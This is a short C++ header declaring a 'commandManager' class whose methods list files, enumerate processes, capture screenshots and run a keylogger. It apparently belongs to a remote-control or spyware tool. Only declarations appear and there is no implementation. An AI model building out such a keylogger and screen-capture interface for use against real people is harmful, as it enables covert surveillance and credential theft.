#pragma once
class commandManager
{
//private:

public:
	commandManager();
	void getFilelist(LPCWSTR path);
	void getProcess();
	bool getScreen(LPCSTR fname);
	void keyLogger();
};

